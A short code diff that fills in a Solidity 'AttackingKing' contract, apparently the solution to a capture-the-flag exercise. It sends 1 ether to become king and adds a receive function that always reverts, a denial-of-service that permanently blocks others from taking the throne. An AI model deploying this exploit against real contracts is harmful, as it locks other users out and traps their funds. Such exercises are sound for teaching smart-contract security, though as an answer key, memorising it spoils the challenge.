@@ -11,6 +11,14 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // Attacker become the King (assuming has enough funds for current prize)
+        (bool success, ) = contractAddress.call{value: 1 ether}("");
+        require(success);
+    }
+
+    receive() external payable {
+        // Once attacker is the king, will revert
+        // any attempt by others to become the new king
+        revert("Sorry, you will never be the king");
     }
 }
